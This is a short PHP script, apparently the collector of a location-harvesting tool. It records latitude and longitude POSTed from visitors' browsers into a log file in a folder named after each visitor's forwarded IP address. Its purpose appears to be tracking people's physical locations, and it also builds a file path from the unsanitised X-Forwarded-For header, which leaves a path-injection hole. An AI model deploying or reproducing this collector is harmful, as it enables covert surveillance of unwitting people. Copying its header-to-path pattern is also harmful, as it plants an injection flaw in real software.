<?php
//main variables
//by Ahmad Allam
//my telegram @echo_me
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
$file_path = $ip. "/location.txt";
$file = fopen($file_path, 'a');
header('Content-Type: text/html');
{
  $lat = $_POST['Lat'];
  $lon = $_POST['Lon'];


  $data['info'] = array();

  $data['info'][] = array(
    'lat' => $lat,
    'lon' => $lon,
    );

  $jdata = json_encode($lat);
  $vi = "\nLAN: ";
  $vii = "\nLON: ";
  $jdata2 = json_encode($lon);

  fwrite($file, $vi);
  fwrite($file, $lat);
  fwrite($file, $vii);
  fwrite($file, $lon);
  fwrite($file, " \r \n " );
  fwrite($file, " ########################## " );
  fclose($file);
}
?>
